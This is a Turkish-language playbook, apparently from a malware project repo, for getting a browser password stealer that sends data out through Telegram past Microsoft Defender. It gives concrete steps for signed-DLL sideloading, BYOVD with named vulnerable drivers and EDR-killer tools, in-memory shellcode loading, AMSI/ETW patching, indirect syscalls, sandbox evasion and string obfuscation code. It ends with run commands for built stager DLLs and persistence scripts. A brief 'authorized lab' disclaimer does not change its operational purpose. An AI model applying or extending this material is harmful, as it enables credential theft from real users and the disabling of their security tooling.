# Ultra-Max Defender Evasion Playbook (2026)

Bu doküman, `PWS:MSIL/Polazert.GA!MTB` tespitinden sonra hazırlandı. Amaç tek bir
"hile" değil, her tespit kanalını ayrı ayrı ele alan katmanlı bir yapı kurmak.
Hiçbir yöntem güncel Defender + Tamper Protection + cloud/behavior/ML karşısında
**garanti** değildir; amaç tespit maliyetini ve olasılığını düşürmektir.

---

## 0. Mevcut durum

| Alan | Durum |
|---|---|
| Telegram | Çalışıyor: Bot API testi OK (token/chat `.env` içinde, repoya girmez) |
| Payload | Raw browser exfil + ZIP + `sendDocument` |
| Loader | `temp-exec`, self-copy + `HKCU\Run`, klasör ikonlu EXE |
| Defender | `PWS:MSIL/Polazert.GA!MTB`, Quarantined, "captures user passwords" |

`PWS` = password stealer ailesi; `!MTB` = ML/behavior tespiti. Yani Defender
sadece dosyaya değil, **davranış zincirine** de bakıyor: tarayıcı DB erişimi +
kimlik bilgisi çözme + ZIP + Telegram. İkon, isim, UPX gibi kozmetik değişiklikler
bu tespiti geçmez.

---

## 1. Neden yakalanıyor (tetikleyiciler)

1. **İmzasız yükleyici + kalıcılık:** self-copy, `%APPDATA%\Microsoft\WindowsRuntime`,
   `winhost.exe`, `WindowsRuntimeHost` Run değeri.
2. **Temp EXE:** şifre çözülüp `%TEMP%`'e EXE yazılması ve çalıştırılması.
3. **Tarayıcı kimlik bilgisi erişimi:** `Login Data`/`Cookies` okuma, DPAPI, AES-GCM.
4. **Telegram exfil:** `api.telegram.org`, `sendDocument` string'leri ve ZIP upload.
5. **Yüksek entropi / paketli Rust binary:** ML için tipik loader profili.
6. **Düz metin string'ler:** `Login Data`, `Cookies`, `WindowsRuntimeHost`, `--no-install`.

---

## 2. Katmanlı model

```
Delivery  →  Execution  →  Telemetry  →  Behavior  →  Payload  →  Kernel  →  C2
(signed)     (in-memory)   (AMSI/ETW)    (raw/split)   (obfusc.)   (BYOVD)   (mature)
```

Her katman farklı bir tespit kanalını hedefler. Sadece birini değiştirmek yetmez.

---

## 3. Delivery (teslim)

### 3.1 Signed DLL sideload (admin gerekmez) — en yüksek ROI

İmzalı bir host EXE, kendi dizininden bir DLL yükler. DLL'i oraya koyarsın;
host imzalı görünür, DLL senin kodunu çalıştırır. UAC yok, imzasız EXE diskte yok.

2026'da gözlenen zincirler:

- `wmpdmc.exe` (Microsoft-signed) + `wmpdui.dll` (Yoba kampanyası, 2026-10)
- `msimg32.dll` sideload (Druva BYOVD raporu, 2026-04)
- `winmm.dll` sideload (Yoba installer zinciri)
- OneDrive/Teams/Zoom/Discord gibi yaygın uygulamalar (sürüme bağlı)

Örnek yerleşim:

```
%LOCALAPPDATA%\WMProcess\
├── wmpdmc.exe      (C:\Windows\System32'den kopya, imzalı)
└── wmpdui.dll      (bizim proxy DLL)
```

Çalıştırma: `wmpdmc.exe` → kendi dizinindeki `wmpdui.dll`'i yükler → `DllMain`
payload'ı çalıştırır. Kalıcılık: Scheduled Task (`schtasks /create ... /sc onlogon`).

Proxy DLL gereksinimleri:
- Host'un `wmpdui.dll`'den import ettiği fonksiyonları **forward** etmek
  (`.def` dosyası: `Func=real_wmpdui.Func`), ayrıca `DllMain`'de payload.
- Export listesini host'tan çıkar: `dumpbin /imports wmpdmc.exe` veya
  `objdump -p wmpdmc.exe | grep -A50 "DLL Name: wmpdui.dll"`.
- Export yoksa/`LoadLibrary` ile yükleniyorsa sadece `DllMain` yeterli.

Avantaj: process kimliği imzalı; process-tabanlı davranış kuralları büyük ölçüde
atlanır. Dezavantaj: DLL yine taranır; host/sürüm bağımlılığı; davranış izleme.

### 3.2 Signed LOLBin (yedek)

- `rundll32.exe payload.dll,Run`
- `regsvr32.exe /s /i:... payload.dll`
- `mshta`, `msbuild`, `installutil` — AMSI/behavior tarafından yoğun izlenir.
- `rundll32` hızlı test için iyidir; kalıcı/stealth için sideload daha iyi.

### 3.3 BYOVD (admin varsa) — "ultra max" çekirdek

1. Savunmasız ama imzalı bir sürücü yükle (Microsoft blocklist'te olmayan).
2. IOCTL ile `MsMpEng.exe`/EDR process'lerini sonlandır, kernel callback'leri kaldır.
3. Araçlar: **Terminator**, **EDRSandblast**, **KDU**, **Krueger**.
4. Sürücü örnekleri: `wsftprm.sys`, `gdrv.sys`, `RTCore64.sys`,
   `DBUtilDrv2.sys`, `ThrottleStop`, `kprocesshacker` (blocklist'i kontrol et).

Kısıtlar: **HVCI** en büyük engel; PatchGuard; blocklist; sistem kararsızlığı.
Sadece snapshot alınmış lab VM'de dene.

```powershell
# örnek (lab): Terminator / EDRSandblast kullanımı araçların README'sinde
# schtasks ile SYSTEM olarak çalıştır, sonra snapshot'a dön
```

Lab otomasyonu: `tools/byovd_lab.ps1` (admin + operatörün sağladığı tool/driver;
önce snapshot). Script driver indirmez/bundle etmez; HVCI/blocklist/PatchGuard
uyarılarını ve pre/post Defender durumunu JSON'a yazar.

---

## 4. Execution (bellekte çalıştırma)

- **Donut**: PE → shellcode. **sRDI**: DLL → shellcode.
- Shellcode'u imzalı host içinde çalıştır; temp EXE yazma.
- Reflective loader (mevcut `pe::map_into_self`) alternatif.
- **Sleep obfuscation**: Ekko, Foliage, Cronos, DeathSleep.
- **Call-stack spoofing**: SilentMoonwalk, Vulcan.
- Rust/tokio notu: reflective/in-memory yükleme TLS açısından riskli; TG-only
  modda in-process TLS yok ama Rust std TLS thread-local'leri var. Test et;
  olmazsa temp-exec'e dön.

---

## 5. Telemetry (AMSI/ETW/syscall)

- **AMSI**: `AmsiScanBuffer` → `E_INVALIDARG`; alternatif hardware breakpoint.
- **ETW**: `EtwEventWrite`/`NtTraceEvent` patch; provider düzeyinde kapatma.
- **Unhooking**: KnownDLLs/disk'ten temiz `ntdll` yükle.
- **Syscalls**: SysWhispers3, FreshyCalls, HellsGate, TartarusGate; indirect
  syscall (call stack'i ntdll içinde göstermek için).
- **Sınır**: kernel callback'leri ve ETW-TI kullanıcı modundan kapatılamaz;
  MDE bu yüzden direct syscall'lara karşı hâlâ görür.

---

## 6. Behavior (davranış)

- Tarayıcı DB'lerini **raw** taşı (yapıldı); doğrudan `CopyFileExW` ile kopyala
  (hasatta hiç `cmd.exe` yok), ZIP/upload'ı imzalı `tar.exe`/`curl.exe` yapsın.
- **Run key'i kaldır**: Scheduled Task, COM hijack (HKCU CLSID), Startup klasörü.
- Yolları/isimleri rastgeleleştir; `WindowsRuntimeHost`, `winhost.exe` string'lerini
  kullanma.
- Sandbox/VM kontrolleri: CPUID, MAC, disk boyutu, uptime, kullanıcı adı, process
  listesi (procmon, wireshark, x64dbg...), domain-joined.
- Idle/mouse/oturum kontrolü; gecikmeli ve parçalı hasat; chunked upload.
- `api.telegram.org` string'ini obfuscate et (aşağıda).

---

## 7. Payload / static

- String obfuscation: URL, method adları, browser dosya adları, Run key.
- API hashing / runtime resolution.
- Payload'ı böl, düşük entropiyle sakla; farklı derleyici (C loader) dene.
- Geçerli code-signing sertifikası (EV) varsa imzala; self-signed işe yaramaz.

Örnek string obfuscation (basit XOR):

```rust
fn de(data: &[u8]) -> String {
    let mut v = Vec::with_capacity(data.len());
    for (i, &b) in data.iter().enumerate() {
        v.push(b ^ (0x5A + (i as u8).wrapping_mul(31)));
    }
    String::from_utf8_lossy(&v).into_owned()
}
// "api.telegram.org" -> de(&[...])
```

---

## 8. C2

- Mature C2: **Havoc**, **Sliver**, **Mythic**; Telegram exfil'i post-ex modülü yap.
- Domain fronting/CDN, malleable profile, jitter, sleep obfuscation.
- Sabit Telegram string'lerinden kaçın; proxy/domain front kullan.

---

## 9. Bu repo için önerilen sıra

1. **Doğrula:** Defender exclusion + `Sənədlər.exe --no-install`; Telegram'ı teyit et.
2. **Hızlı kazanç:** Telegram/browser string obfuscation; Run key'i Scheduled
   Task'e çevir; yolları rastgeleleştir.
3. **Signed DLL sideload:** `wmpdmc.exe` + `wmpdui.dll` proxy (veya hedefteki
   uygun host). DLL `DllMain`'de loader'ı çalıştırır.
4. **In-memory:** Donut/sRDI ile shellcode; temp EXE'yi kaldır.
5. **Telemetry:** DLL loader'a AMSI/ETW patch + indirect syscall ekle.
6. **Admin varsa:** BYOVD (Terminator/EDRSandblast) snapshot VM'de.
7. **Code signing** mümkünse.
8. Gerçek engagement: Havoc/Sliver + Telegram modülü.

---

## 10. 2026 referansları

- Druva — *Weaponizing Trust: BYOVD* (2026-04): msimg32.dll sideload + driver kill.
- Symantec — *Lights Out: Defense Evasion in the Age of BYOVD* (2026-06).
- WizardCyber — *Yoba fake AI app sideloading chain* (2026-10): wmpdmc.exe + wmpdui.dll.
- Fortinet — *Winos 4.0* (2026-02): LNK downloader + DLL sideload + wsftprm.sys BYOVD.
- Bitdefender — *What is DLL Sideloading* (2026-05).
- CSO Online — *Windows Bind Link techniques* (2026-07).
- Microsoft Learn — *Tamper protection overview* (2026-09): exclusions/PowerShell
  changes are blocked when Tamper Protection is on.
- AMSI/ETW/direct syscall yazıları (2026): RingSafe, ThreatMatrix, Julio Henkes,
  iimp0ster detection chokepoints.

---

## 11. Dürüst sınırlar

- Tam güncel Defender + Tamper Protection + cloud + behavior + ML: **garanti yok**.
- BYOVD: HVCI/blocklist/PatchGuard; sistem çökebilir; sadece lab VM.
- DLL sideload: host sürümüne bağlı; DLL yine taranır; davranış izlenir.
- Özel yazılmış imzasız stealer'lar yüksek risklidir; imzalı host + mature C2
  genelde daha güvenilirdir.
- Tüm çalışmalar yetkili lab/engagement kapsamında olmalı.

---

## 12. Bu repo'da hazır artefaktlar (2026-11)

| Artefakt | Mod | Açıklama |
|---|---|---|
| `dist/wmpsvc.dll` | Donut shellcode | C stager + Donut (PE→shellcode) + ETW/AMSI patch; `Run` export; **birincil** |
| `dist/wmpdui.dll` | reflective | Rust reflective + ETW/AMSI patch; `DllMain` + `Run` |
| `dist/stager.exe` | Donut shellcode | Aynı C stager'ın EXE hali (in-memory, disk yok) |
| `dist/wmpsvc2.dll` | indirect syscall + callback (deneysel) | taze ntdll'den SSN/syscall çözümü, hedefli stub restore, `EnumWindows` callback |
| `dist/stager2.exe` | aynı, EXE hali | `CreateThread` yok |
| `dist/loader.exe` / `dist/usb/Sənədlər.exe` | temp-exec | Fallback; `--persist` opt-in, varsayılan kalıcılıksız |
| `tools/sideload.ps1` | — | DLL/EXE'yi `%LOCALAPPDATA%\WMProcess`'e kurar + logon task |

### Kullanım

```cmd
:: birincil: imzalı rundll32 + Donut shellcode + ETW/AMSI patch (tam in-memory)
rundll32.exe E:\_sys\wmpsvc.dll,Run

:: alternatif: Rust reflective DLL
rundll32.exe E:\_sys\wmpdui.dll,Run

:: kalıcılık + logon task
powershell -ExecutionPolicy Bypass -File tools\sideload.ps1 -Dll E:\_sys\wmpsvc.dll

:: signed host sideload (wmpdmc.exe + wmpdui.dll)
powershell -ExecutionPolicy Bypass -File tools\sideload.ps1 -Dll E:\_sys\wmpdui.dll -UseWmpHost

:: temp-exec fallback (kalıcılıksız)
E:\_sys\stager.exe
```

Reflective mapping Rust/tokio için TLS açısından riskli. Çökerse DLL'i temp-exec
olarak yeniden üret:

```bash
cargo run -p crypter-packer -- target/x86_64-pc-windows-gnu/release/implant.exe crypter/dll-loader/src
cargo build -p crypter-dll --release --target x86_64-pc-windows-gnu
# wmpdui.dll artık payload'ı %TEMP%'e açar (rundll32 ile uyumlu)
```

Doğrulama (Linux): her iki artefakt için `decrypt(payload.enc) == implant.exe`,
blob gömülü, tamper/yanlış anahtar reddi → PASS.
